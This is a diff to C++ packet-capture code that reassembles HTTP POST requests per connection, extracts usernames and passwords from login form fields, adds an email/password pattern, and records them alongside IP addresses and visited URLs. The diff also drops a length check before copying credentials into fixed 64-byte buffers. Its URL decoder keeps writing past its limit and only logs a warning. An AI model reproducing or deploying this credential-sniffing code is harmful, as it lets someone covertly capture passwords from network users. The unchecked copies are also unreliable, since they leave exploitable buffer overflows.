@@ -2,6 +2,7 @@
 #include <iostream>
 #include <map>
 #include <stdlib.h>
+#include <stdio.h>
 #include <string.h>
 #include <net/ethernet.h>
 #include <arpa/inet.h>
@@ -17,11 +18,6 @@
 #include <ctime>
 std::map<std::string, time_t> url_time_map;
 
-struct HOSTDATA
-{
-	char strIP[20];
-	char strHost[50];
-};
 struct MAIL_LOGIN_KEY
 {
 	char user[16];
@@ -29,14 +25,14 @@ struct MAIL_LOGIN_KEY
 	char select[16];
 };
 
-char CharToInt(char ch){
+static char CharToInt(char ch){
 	if(ch>='0' && ch<='9')return (char)(ch-'0');
 	if(ch>='a' && ch<='f')return (char)(ch-'a'+10);
 	if(ch>='A' && ch<='F')return (char)(ch-'A'+10);
 	return -1;
 }
 
-char StrToBin(char *str){
+static char StrToBin(char *str){
 	char tempWord[2];
 	char chn;
 
@@ -48,7 +44,7 @@ char StrToBin(char *str){
 	return chn;
 }
 
-void UrlGB2312Decode(const char *pInput,int nInputLen,char *pOutput,int nOutputLen)
+static void UrlGB2312Decode(const char *pInput,int nInputLen,char *pOutput,int nOutputLen)
 {
 	char tmp[2];
 	int i=0;
@@ -60,15 +56,28 @@ void UrlGB2312Decode(const char *pInput,int nInputLen,char *pOutput,int nOutputL
 			tmp[0]=pInput[i+1];
 			tmp[1]=pInput[i+2];
 			pOutput[strlen(pOutput)]= StrToBin(tmp);
+			if(strlen(pOutput)>63)
+			{
+				fprintf(stderr,"UrlGB2312Decode,pOutput over\n");
+			}
+
 			i=i+3;
 		}
 		else if(pInput[i]=='+'){
 			pOutput[strlen(pOutput)]=' ';
 			i++;
+			if(strlen(pOutput)>63)
+			{
+				fprintf(stderr,"UrlGB2312Decode,pOutput over\n");
+			}
 		}
 		else{
 			pOutput[strlen(pOutput)]=pInput[i];
 			i++;
+			if(strlen(pOutput)>63)
+			{
+				fprintf(stderr,"UrlGB2312Decode,pOutput over\n");
+			}
 		}
 	}
 }
@@ -97,43 +106,49 @@ size_t GetSepTextByChar(const std::string &strText, const char *sep, std::vector
 	return vec.size();
 }
 
-bool ParseTcpPkt(const char* tcpdata, size_t tcpdata_len, std::string& url, std::string& usr, std::string& pwd)
+bool ParseTcpPkt(std::string strIndex, const char* tcpdata, size_t tcpdata_len, std::string& url, std::string& usr, std::string& pwd)
 {
-	static std::string strHtml;
+	static std::map<std::string, std::string> ip_html_map;
+	if (ip_html_map.size() >10000)
+		ip_html_map.clear();
+
 	std::string strdata(tcpdata, tcpdata_len);
 
 	//data begin with "POST"
-	if (strdata.find("POST") != 0 && strHtml == "")
+	if (strdata.find("POST") != 0 && (ip_html_map.find(strIndex) == ip_html_map.end() ||ip_html_map[strIndex] == ""))
 		return false;
 
-	strHtml += strdata;
+	if (strdata.find("POST") == 0 || ip_html_map[strIndex].size() >4*1024)
+		ip_html_map[strIndex] = "";
+
+	ip_html_map[strIndex] += strdata;
 
 	size_t pos = std::string::npos;
-	if ((pos = strHtml.find("\r\n\r\n", 0)) == std::string::npos)
+	if ((pos = ip_html_map[strIndex].find("\r\n\r\n", 0)) == std::string::npos)
 		return false;
 
-	std::string html_header = strHtml.substr(0, pos+4);
-	std::string html_body = strHtml.substr(pos+4, strdata.size() -pos-4);
+	std::string html_header = ip_html_map[strIndex].substr(0, pos+4);
+	std::string html_body = ip_html_map[strIndex].substr(pos+4, strdata.size() -pos-4);
 
 	//get the html field "Content Length"
 	size_t p1 = std::string::npos, p2 = std::string::npos;
-	if ((p1 = html_header.find("Content-Length: ")) == std::string::npos ||
+	if ((p1 = html_header.find("Content-Length: ")) == std::string::npos || 
 		(p2 = html_header.find("\r\n", p1)) == std::string::npos)
 	{
-		strHtml = "";
+		ip_html_map[strIndex] = "";
 		return false;
 	}
 	p1 += strlen("Content-Length: ");
 	std::string content_len = html_header.substr(p1, p2-p1);
-	size_t len = atoi(content_len.c_str());
+	int len = atoi(content_len.c_str());
 
 	if (len> html_body.size())
 		return false;
 
-	strHtml = "";
+	ip_html_map[strIndex] = "";
 
 	//url
-	if ((p1 = html_header.find("Host: ")) == std::string::npos ||
+	if ((p1 = html_header.find("Host: ")) == std::string::npos || 
 		(p2 = html_header.find("\r\n", p1)) == std::string::npos)
 		return false;
 	p1 += strlen("Host: ");
@@ -143,7 +158,7 @@ bool ParseTcpPkt(const char* tcpdata, size_t tcpdata_len, std::string& url, std:
 	std::map<std::string, std::string> usr_pwd_map;
 	std::vector<std::string> line_vector;
 	if (GetSepTextByChar(html_body, "&", line_vector) == 0)
-		return false;
+		return false;	
 
 	std::vector<std::string>::const_iterator it = line_vector.begin();
 	for (;it != line_vector.end(); ++it)
@@ -164,6 +179,7 @@ bool ParseTcpPkt(const char* tcpdata, size_t tcpdata_len, std::string& url, std:
 	keyword_map.insert(std::make_pair("pwuser", "pwpwd"));
 	keyword_map.insert(std::make_pair("name", "pwd"));
 	keyword_map.insert(std::make_pair("vwriter", "vpassword"));
+	keyword_map.insert(std::make_pair("email", "password"));
 
 	std::multimap<std::string, std::string>::iterator it_map = keyword_map.begin();
 	for (; it_map != keyword_map.end(); ++it_map)
@@ -173,9 +189,6 @@ bool ParseTcpPkt(const char* tcpdata, size_t tcpdata_len, std::string& url, std:
 		{
 			usr = usr_pwd_map[it_map->first];
 			pwd = usr_pwd_map[it_map->second];
-
-			if (usr.size() >64 || pwd.size()>64)
-				return false;
 
 			char szUser[64] = {0};
 			char szPassword[64] = {0};
@@ -188,7 +201,7 @@ bool ParseTcpPkt(const char* tcpdata, size_t tcpdata_len, std::string& url, std:
 		}
 	}
 
-	return false;
+	return false;	
 }
 
 
@@ -219,38 +232,7 @@ static int RecordPOST(const char *user, const char*pswd, const char*host, u_char
 
 static int RecordUrl(char *url,u_char*packet,in_addr_t sip,in_addr_t dip)
 {
-	static pthread_mutex_t lock=PTHREAD_MUTEX_INITIALIZER;
 	std::string strUrl(url);
-	size_t nstart = std::string::npos;
-	size_t count_splash = 0;
-
-
-	while ((nstart = strUrl.find('/', nstart +1)) != std::string::npos)
-		++count_splash;
-
-	if (count_splash >4)
-		return 0;
-
-	time_t tmNow = time(NULL);
-
-	pthread_mutex_lock(&lock);
-	std::map<std::string, time_t>::iterator it = url_time_map.begin();
-	for (; it != url_time_map.end();)
-	{
-		if (tmNow - it->second > 60*2)
-			url_time_map.erase(it++);
-		else
-			++it;
-	}
-
-	if (url_time_map.find(strUrl) != url_time_map.end())
-	{
-		pthread_mutex_unlock(&lock);
-		return 0;
-	}
-
-	url_time_map[strUrl] = tmNow;
-	pthread_mutex_unlock(&lock);
 
     struct NetAcount na(NetAcountType_HTTP,packet);// = (struct NetAcount*)malloc(8190);
 
@@ -286,126 +268,34 @@ static int GetHttpPost(struct so_data*, u_char*packet)
 		return 0; // POST \r\n\r\n 几个字节？
 
 	//add 090901
-	std::string url, usr, pwd;
-	if( ParseTcpPkt(tcpdata, tcpdatelen, url, usr, pwd) == true)
-	{
-		return RecordPOST(usr.c_str(), pwd.c_str(), url.c_str(), packet,ip_head->saddr, ip_head->daddr);
-	}
-	return 0;
-	//end 090901
 
-	HOSTDATA* pHostData;
-	std::map<in_addr_t, HOSTDATA>::iterator it;
-	static std::map<in_addr_t,HOSTDATA> host_list;
-	static pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
-	pthread_mutex_lock(&lock);
-	it = host_list.find(ip_head->daddr);
-	if (it != host_list.end())
-		pHostData = &it->second;
-	else
-		pHostData = NULL;
-	pthread_mutex_unlock(&lock);
-	const int nSize = 50;
-	char pUser[50] =
-	{ 0 };
-	char pPassword[50] =
-	{ 0 };
-	char pHost[50] =
-	{ 0 };
+	//static pthread_mutex_t lock=PTHREAD_MUTEX_INITIALIZER;
+	//pthread_mutex_lock(&lock);
 
-	if (!pHostData)
+	try
 	{
-		if (memcmp("POST ", tcpdata, 5) == 0)
+		char strIndex[128] = {0};
+		snprintf(strIndex, sizeof(strIndex), "%d%d%d%d",
+			ip_head->daddr, 
+			ip_head->saddr,
+			tcp_head->dest,
+			tcp_head->source);
+
+		std::string url, usr, pwd;
+
+		if(ParseTcpPkt(strIndex, (const char*)tcpdata, tcpdatelen, url, usr, pwd))
 		{
-			char *pPos = NULL;
-			pPos = strstr((char *) tcpdata, "Host:");
-			if (pPos)
-			{
-				pPos = pPos + 6;
-				char *pTemp = strstr(pPos, "\r\n");
-				if (pTemp)
-				{
-					if (pTemp - pPos >= nSize)
-						return 0;
-					if (pTemp - pPos < 4)
-						return 0;
-					strncpy(pHost, pPos, pTemp - pPos);
-					HOSTDATA HostData;
-					inet_neta(ip_head->daddr, HostData.strIP, 20);
-					strcpy(HostData.strHost, pHost);
-					pthread_mutex_lock(&lock);
-					if (host_list.size() > 2000)
-						host_list.erase(host_list.begin());
-					host_list.insert(std::pair<in_addr_t, HOSTDATA>(
-							ip_head->daddr, HostData));
-					pthread_mutex_unlock(&lock);
-				}
-			}
+			int nret =  RecordPOST(usr.c_str(), pwd.c_str(), url.c_str(), packet,ip_head->saddr, ip_head->daddr);
+			//pthread_mutex_unlock(&lock);
+			return nret;
 		}
+
 	}
-	else
+	catch (...)
 	{
-		strcpy(pHost, pHostData->strHost);
+		//pthread_mutex_unlock(&lock);
+		return 0;
 	}
-
-	MAIL_LOGIN_KEY loginKeys[] =
-	{
-	{ "username=", "password=", "&" },
-	{ "pwuser=", "pwpwd=", "&" },
-	{ "user=", "password=", "&" },
-	{ "user=", "pwd=", "&" },
-	{ "pwuser=", "password=", "&" },
-	{ "account=", "pass=", "&" },
-	{ "account=", "password=", "&" },
-	{ "pwuser=", "pass=", "&" },
-	{ "", "", "" } };
-
-	for (int i = 0;; i++)
-	{
-		MAIL_LOGIN_KEY &key = loginKeys[i];
-
-		if (strlen(key.user) == 0)
-			break;
-
-		char *pPos = NULL;
-		char *pTemp = NULL;
-		pPos = strstr((char *) tcpdata, key.user);
-		if (pPos)
-		{
-			if (strlen(pUser) == 0)
-			{
-				pPos = pPos + strlen(key.user);
-				pTemp = strstr(pPos, key.select);
-				if (pTemp)
-				{
-					if (pTemp - pPos >= nSize)
-						continue;
-					strncpy(pUser, pPos, pTemp - pPos);
-				}
-				else
-					continue;
-			}
-
-			pPos = strstr(tcpdata, key.password);
-			if (pPos)
-			{
-				pPos = pPos + strlen(key.password);
-				pTemp = strstr(pPos, key.select);
-				if (pTemp)
-				{
-					if (pTemp - pPos >= nSize)
-						continue;
-					strncpy(pPassword, pPos, pTemp - pPos);
-					return RecordPOST(pUser,pPassword,pHost,packet,ip_head->saddr, ip_head->daddr);
-				}
-				else
-					continue;
-			}
-		}
-	}
-	if (strlen(pUser))
-		return RecordPOST(pUser, pPassword, pHost, packet,ip_head->saddr, ip_head->daddr);
-	return 0;
 }
 
 static int url_packet_callback(struct so_data* sodata, u_char * packet)
@@ -427,11 +317,11 @@ static int url_packet_callback(struct so_data* sodata, u_char * packet)
     /*太小的包肯定就不是*/
     if (tcpdatelen < 10)return 0; // GET / HTTP/1.1\r\n\r\n 几个字节？
 
-    const int nSize = 4096;
-    char *pUrl = new char[nSize];
+    const int nSize = 300;
+    char pUrl[300];//= new char[nSize];
 
     memset(pUrl, 0, nSize);
-    static char strOldUrl[5][250];
+    static char strOldUrl[20][300];
     static int nCurPos = 0;
     if (memcmp("GET ", tcpdata , 4) == 0 || memcmp("POST ", tcpdata, 5) == 0)
     {
@@ -447,23 +337,37 @@ static int url_packet_callback(struct so_data* sodata, u_char * packet)
 				if (pTemp - pPos >= nSize)
 					return 0;
 				strncpy(pUrl, pPos, pTemp - pPos);
-				for (int n = 0; n < 5; n++)
+				for (int n = 0; n < 20; n++)
 				{
 					if (strcmp(strOldUrl[n], pUrl) == 0)
 						return 0;
 				}
-				memset(strOldUrl[nCurPos], 0, 50);
+
+				int nLen = strlen(pUrl);
+
+				if (nLen >= nSize)
+					return 0;
+				if (nLen <= 5)
+					return 0;
+
+				memset(strOldUrl[nCurPos], 0, 300);
 				strcpy(strOldUrl[nCurPos], pUrl);
 				nCurPos++;
-				nCurPos %= 5;
+				nCurPos %= 20;
 			}
-			int nLen = strlen(pUrl);
 
-			if (nLen >= nSize)
-                return 0;
-            if (nLen <= 5)
-                return 0;
-            return RecordUrl(pUrl,packet,ip_head->saddr ,ip_head->daddr);
+
+			try
+			{
+				int nret = RecordUrl(pUrl,packet,ip_head->saddr ,ip_head->daddr);
+
+				return nret;
+			}
+			catch (...)
+			{
+				return 0;
+			}
+            
         }
     }
     return 0;
